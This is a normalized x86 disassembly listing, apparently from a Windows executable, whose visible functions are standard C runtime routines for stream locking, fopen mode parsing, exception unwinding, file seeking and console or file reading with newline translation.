call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
lea eax [ ecx + 0x10 ]
push eax
call sub_416445
pop ecx
pop ebp
retn
sub_412a6d
push 0x10
push r--data
call sub_4110a0
xor ebx ebx
mov esi ebx
mov [ ebp - 0x1c ] esi
push 0x1
call sub_4162e1
pop ecx
mov [ ebp - 0x4 ] ebx
mov edi ebx
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412b7c
mov eax esi
call sub_4110e5
retn
and [ esi + 0xc ] 0x8000
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi ] ebx
mov [ esi + 0x1c ] ebx
or [ esi + 0x10 ] 0xffffffff
push 0x38
call sub_41100b
pop ecx
mov ecx eax
mov eax [ rw-data ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
push 0xfa0
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov esi [ eax + edi * 4 ]
mov [ ebp - 0x1c ] esi
mov [ esi + 0xc ] ebx
inc edi
jmp r-xdata
test [ eax + 0xc ] 0x8000
jne r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
lea eax [ edi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + edi * 4 ]
push edi
call sub_4129d6
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ edi + 0x10 ]
push eax
call sub_416369
pop ecx
test eax eax
je r-xdata
mov esi eax
mov [ ebp - 0x1c ] esi
jmp r-xdata
push eax
push edi
call sub_412a40
pop ecx
pop ecx
sub_412b85
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ rw-data ]
xor ecx ecx
push 0x20
mov edx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
pop eax
jmp r-xdata
cmp [ esi ] ax
je r-xdata
add esi 0x2
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
push 0x20
pop eax
jmp r-xdata
mov [ ebp + 0xc ] 0x1000
mov ebx ecx
or edi 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
cmp [ esi ] ax
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
add esi 0x2
xor ecx ecx
movzx eax [ esi ]
inc ecx
test ax ax
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_411550
mov [ eax ] 0x16
call sub_411714
add esi 0x2
xor eax eax
cmp [ esi ] ax
jne r-xdata
push 0x20
pop eax
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or edi 0x2
pop edi
pop esi
pop ebx
leave
retn
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_419d1a
add esp 0x14
test eax eax
jne r-xdata
cmp [ esi ] ax
je r-xdata
mov eax [ ebp + 0xc ]
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] ecx
add esi 0x2
push 0x3
push esi
push r--data
call sub_419d38
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x20
jmp r-xdata
add esi 0x2
movzx eax [ esi ]
test ax ax
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x6
pop eax
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] ax
je r-xdata
inc edx
or edi 0x4000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0x6
jne r-xdata
and ebx 0xfffffffe
and edi 0xfffffffc
or ebx 0x2
or edi 0x80
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
add esi 0x2
cmp [ esi ] 0x3d
jne r-xdata
inc edx
and edi 0xffffbfff
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
add esi 0x2
cmp [ esi ] ax
je r-xdata
or ebx 0x4000
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_419d6e
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_419d6e
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_419d6e
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
sub_412e30
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_412ec0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_41a035
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_41a054
jmp r-xdata
sub_412ec0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40e09b
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_412e30
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_412f22
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_412f52
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_412f82
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_411550
mov [ eax ] 0x16
call sub_411714
or eax 0xffffffff
pop ebp
retn
sub_412fa6
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_412fec
pop ecx
test eax eax
je r-xdata
push esi
call sub_413059
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_412f82
push eax
call sub_41a41d
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_412fec
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0xc ]
and al 0x3
cmp al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] ecx
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test [ esi + 0xc ] 0x108
je r-xdata
push edi
mov edi [ esi ]
sub edi [ esi + 0x8 ]
test edi edi
jle r-xdata
pop edi
push edi
push [ esi + 0x8 ]
push esi
call sub_412f82
pop ecx
push eax
call sub_4141f0
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_413059
push 0x14
push r--data
call sub_4110a0
xor edi edi
mov [ ebp - 0x1c ] edi
and [ ebp - 0x24 ] edi
push 0x1
call sub_4162e1
pop ecx
and [ ebp - 0x4 ] edi
xor esi esi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413134
cmp ebx 0x1
mov eax edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_4110e5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_4129d6
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_413101
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push eax
call sub_412fa6
pop ecx
cmp eax 0xffffffff
je r-xdata
test [ eax + 0xc ] 0x2
je r-xdata
inc edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
call sub_412fa6
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_41313d
push 0x18
push r--data
call sub_4110a0
or esi 0xffffffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x9
jmp r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x9
call sub_411714
cmp edi [ rw-data ]
jae r-xdata
mov edx esi
mov eax edi
sar eax 0x5
mov [ ebp - 0x1c ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ eax + ebx + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_41a057
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x1
je r-xdata
call sub_411550
mov [ eax ] 0x9
call sub_41151c
and [ eax ] 0x0
mov ebx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_413239
add esp 0x10
mov esi eax
mov ebx edx
jmp r-xdata
mov eax esi
call sub_4110e5
retn
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41320f
mov edx ebx
jmp r-xdata
sub_413239
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_41a30e
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_411550
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_41152f
pop ecx
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax edi
mov edx edi
jmp r-xdata
sub_4132b0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_4132db
push 0x10
push r--data
call sub_4110a0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x9
jmp r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x9
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push esi
call sub_41a057
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_41151c
and [ eax ] 0x0
call sub_411550
mov [ eax ] 0x16
jmp r-xdata
call sub_411550
mov [ eax ] 0x9
call sub_41151c
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4133e3
add esp 0xc
mov edi eax
jmp r-xdata
call sub_411714
call sub_4110e5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4133ba
mov eax edi
jmp r-xdata
sub_4133e3
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0xfffffffe
pop ecx
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x28 ] esi
cmp eax ecx
jne r-xdata
test eax eax
js r-xdata
call sub_41151c
mov [ eax ] edi
call sub_411550
mov [ eax ] 0x9
jmp r-xdata
call sub_41151c
mov [ eax ] edi
call sub_411550
mov [ eax ] 0x9
cmp eax [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ecx eax
sar ecx 0x5
mov ebx eax
mov edx [ ecx * 4 + rw-data ]
and ebx 0x1f
shl ebx 0x6
mov [ ebp - 0xc ] ecx
mov al [ edx + ebx + 0x4 ]
mov [ ebp - 0x24 ] ebx
test al 0x1
je r-xdata
cmp esi 0x7fffffff
jbe r-xdata
test esi esi
je r-xdata
call sub_41151c
mov [ eax ] edi
xor eax eax
jmp r-xdata
test al 0x2
jne r-xdata
call sub_411714
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] edi
jne r-xdata
mov al [ edx + ebx + 0x24 ]
add al al
sar al 0x1
mov [ ebp + 0x13 ] al
movsx eax al
dec eax
je r-xdata
call sub_41151c
and [ eax ] edi
jmp r-xdata
mov eax esi
not eax
test al 0x1
je r-xdata
dec eax
jne r-xdata
call sub_411550
mov [ eax ] 0x16
jmp r-xdata
shr esi 0x1
cmp esi 0x4
jae r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax esi
not eax
test al 0x1
je r-xdata
push esi
call sub_41100b
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
push 0x4
pop esi
mov edx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
test [ edx + ebx + 0x4 ] 0x48
mov [ ebp - 0x1c ] eax
je r-xdata
and esi 0xfffffffe
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_413239
mov ecx [ ebp - 0xc ]
add esp 0x10
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + ebx + 0x28 ] eax
mov eax [ ebp - 0x10 ]
mov [ ecx + ebx + 0x2c ] edx
mov ecx [ ebp - 0xc ]
call sub_411550
mov [ eax ] 0xc
call sub_41151c
mov [ eax ] 0x8
jmp r-xdata
push [ ebp + 0x8 ]
call sub_418172
test eax eax
mov eax [ ebp - 0xc ]
pop ecx
je r-xdata
mov dl [ edx + ebx + 0x5 ]
cmp dl 0xa
je r-xdata
mov eax [ eax * 4 + rw-data ]
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push esi
push [ ebp - 0x1c ]
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
test [ ecx + ebx + 0x4 ] 0x80
je r-xdata
test esi esi
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x14 ]
test ecx ecx
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ecx + ebx ]
call [ GetConsoleMode@IAT ]
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ eax ] dl
xor edi edi
lea edx [ eax + 0x1 ]
mov eax [ ecx * 4 + rw-data ]
inc edi
dec esi
cmp [ ebp + 0x13 ] 0x0
mov [ ebp - 0x1c ] edx
mov [ eax + ebx + 0x5 ] 0xa
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_411550
mov [ eax ] 0x9
call sub_41151c
mov [ eax ] esi
jmp r-xdata
cmp ecx esi
ja r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x13 ] 0x2
jne r-xdata
mov eax [ ecx * 4 + rw-data ]
mov al [ eax + ebx + 0x25 ]
cmp al 0xa
je r-xdata
push eax
call sub_41152f
pop ecx
xor ebx ebx
jmp r-xdata
or ebx 0xffffffff
mov edx [ ebp - 0xc ]
add edi ecx
mov esi [ edx * 4 + rw-data ]
mov al [ esi + ebx + 0x4 ]
test al al
jns r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
shr esi 0x1
mov eax [ eax * 4 + rw-data ]
push esi
push [ ebp - 0x1c ]
push [ eax + ebx ]
call [ ReadConsoleW@IAT ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x13 ] 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ eax + eax ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ edx ] al
mov eax [ ecx * 4 + rw-data ]
inc edx
push 0x2
dec esi
cmp [ ebp + 0x13 ] 0x1
mov [ ebp - 0x1c ] edx
pop edi
mov [ eax + ebx + 0x25 ] 0xa
jne r-xdata
cmp ebx 0xfffffffe
je r-xdata
push eax
call sub_40e8f2
pop ecx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ecx * 4 + rw-data ]
mov al [ eax + ebx + 0x26 ]
cmp al 0xa
je r-xdata
mov eax edi
jmp r-xdata
mov edi ebx
test ecx ecx
je r-xdata
mov esi [ ebp - 0x10 ]
mov eax edi
cdq
sub eax edx
sar eax 0x1
mov edi esi
mov ecx esi
lea edx [ edi + eax * 2 ]
cmp edi edx
jae r-xdata
and al 0xfb
mov ecx [ ebp - 0x10 ]
cmp [ ecx ] 0xa
jne r-xdata
test esi esi
je r-xdata
and al 0xfb
mov ecx [ ebp - 0x10 ]
push 0xa
pop edx
cmp [ ecx ] dx
mov edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
and edi 0xfffffffe
jmp r-xdata
push 0xd
mov [ ebp + 0x10 ] 0x1a
pop edi
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
cmp [ ebp + 0x13 ] 0x1
jne r-xdata
push 0xd
pop ecx
mov edi eax
or al 0x4
jmp r-xdata
push 0x3
pop edi
mov [ edx ] al
mov eax [ ecx * 4 + rw-data ]
push 0xa
inc edx
pop ecx
mov [ ebp - 0x1c ] edx
dec esi
mov [ eax + ebx + 0x26 ] cl
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
jmp r-xdata
push 0xd
pop ecx
mov [ ebp + 0x10 ] 0x1a
mov edi eax
or al 0x4
jmp r-xdata
mov ebx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov eax [ eax * 4 + rw-data ]
or [ eax + ebx + 0x4 ] 0x2
cmp ax di
je r-xdata
test edi edi
je r-xdata
mov ecx [ edx * 4 + rw-data ]
mov al [ ecx + ebx + 0x4 ]
test al 0x40
jne r-xdata
cmp al cl
je r-xdata
mov [ esi + ebx + 0x4 ] al
mov eax [ ebp - 0x10 ]
mov esi eax
lea ecx [ eax + edi ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
cmp eax ecx
jae r-xdata
mov ecx [ edx * 4 + rw-data ]
mov al [ ecx + ebx + 0x4 ]
test al 0x40
jne r-xdata
cmp ax cx
je r-xdata
mov [ esi + ebx + 0x4 ] al
mov eax [ ebp - 0x10 ]
mov esi eax
lea ecx [ eax + edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x20 ] ecx
cmp eax ecx
jae r-xdata
lea eax [ edx - 0x2 ]
cmp ecx eax
jae r-xdata
mov [ esi ] ax
add esi 0x2
add ecx 0x2
jmp r-xdata
dec esi
mov al [ esi ]
test al al
js r-xdata
mov al [ edi ]
mov [ esi ] al
inc esi
or al 0x2
mov [ ecx + ebx + 0x4 ] al
jmp r-xdata
mov eax [ ebp - 0x1c ]
dec eax
cmp edi eax
jae r-xdata
mov [ esi ] al
inc esi
inc edi
jmp r-xdata
mov ax [ edi ]
mov [ esi ] ax
add esi 0x2
or al 0x2
mov [ ecx + ebx + 0x4 ] al
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xfffffffe
cmp edi eax
jae r-xdata
mov [ esi ] ax
jmp r-xdata
cmp ecx edx
jb r-xdata
push 0xa
add ecx 0x2
pop eax
cmp [ ecx ] ax
je r-xdata
movzx eax al
xor edx edx
inc edx
cmp [ eax + rw-data ] 0x0
jne r-xdata
inc esi
jmp r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edx * 4 + rw-data ]
inc edi
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
cmp edi [ ebp - 0x1c ]
jb r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edx * 4 + rw-data ]
add edi 0x2
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push 0xa
pop edx
cmp [ edi + 0x2 ] dx
mov edx [ ebp - 0xc ]
jne r-xdata
add esi 0x2
add edi 0x2
jmp r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x10 ]
je r-xdata
jmp r-xdata
mov [ esi ] ax
add esi 0x2
push 0xd
pop eax
push eax
pop edi
movzx eax [ esi ]
movsx eax [ eax + rw-data ]
test eax eax
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x28 ]
mov edi [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
sub esi edi
push esi
push edi
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cl
inc esi
mov edi eax
jmp r-xdata
push 0xa
pop eax
add edi 0x2
mov [ esi ] al
jmp r-xdata
mov al [ edi ]
cmp al 0x1a
je r-xdata
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cx
push 0xa
pop eax
add edi 0x4
mov [ esi ] ax
jmp r-xdata
cmp edi [ ebp - 0x20 ]
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_411550
mov [ eax ] 0x2a
jmp r-xdata
mov ebx [ ebp - 0x24 ]
cmp esi ebx
jb r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov eax [ eax * 4 + rw-data ]
cmp edi esi
setne cl
add edi edi
mov [ eax + ebx + 0x30 ] ecx
mov edx [ ebp - 0xc ]
push 0xd
pop ecx
mov [ esi ] cl
inc esi
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x48
je r-xdata
inc esi
jmp r-xdata
mov edx [ ebp - 0xc ]
push 0xd
pop ecx
mov [ esi ] cx
add esi 0x2
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x48
je r-xdata
add esi 0x2
jmp r-xdata
movzx eax [ edi ]
cmp ax [ ebp + 0x10 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax * 4 + rw-data ]
test [ ecx + ebx + 0x4 ] 0x48
je r-xdata
add esi edx
jmp r-xdata
dec esi
inc edx
movzx eax [ esi ]
cmp [ eax + rw-data ] 0x0
je r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
push 0xa
pop eax
push 0xd
cmp [ ebp - 0x1 ] al
jne r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
push 0xa
pop eax
push 0xd
cmp [ ebp - 0x8 ] ax
jne r-xdata
neg edx
mov eax edx
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_413239
add esp 0x10
mov al [ esi ]
inc esi
mov [ ecx + ebx + 0x5 ] al
mov eax [ ebp - 0xc ]
cmp edx 0x2
jl r-xdata
cmp edx 0x4
jg r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_413239
mov edx [ ebp - 0xc ]
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x1 ] al
je r-xdata
push 0xa
pop eax
cmp [ ebp - 0x1 ] al
jne r-xdata
mov [ esi ] 0xd
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x1 ]
inc esi
mov [ ecx + ebx + 0x5 ] al
jmp r-xdata
mov [ esi ] al
inc esi
jmp r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_413239
mov edx [ ebp - 0xc ]
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x8 ] ax
je r-xdata
push 0xa
pop eax
cmp [ ebp - 0x8 ] ax
jne r-xdata
pop eax
mov [ esi ] ax
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x8 ]
mov [ ecx + ebx + 0x5 ] al
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x7 ]
mov [ ecx + ebx + 0x25 ] al
mov eax [ edx * 4 + rw-data ]
push 0xa
pop ecx
add esi 0x2
mov [ eax + ebx + 0x26 ] cl
mov [ esi ] ax
add esi 0x2
jmp r-xdata
cmp edx 0x3
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
mov [ ecx + ebx + 0x25 ] al
mov eax [ ebp - 0xc ]
inc esi
push 0xd
push 0xd
pop ecx
mov [ esi ] cl
mov [ esi ] al
inc esi
pop ecx
push 0xd
push 0xd
pop ecx
mov [ esi ] cx
mov [ esi ] ax
add esi 0x2
jmp r-xdata
pop ecx
sub esi edx
jmp r-xdata
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
mov [ ecx + ebx + 0x26 ] al
inc esi
sub_413b72
push 0x64
push r--data
call sub_4110a0
push 0xb
call sub_4162e1
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x40
push 0x20
pop edi
push edi
call sub_410fc1
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_412e30
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x42 ] 0x0
je r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov al [ ecx + 0x24 ]
and al 0x7f
mov [ ecx + 0x24 ] al
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
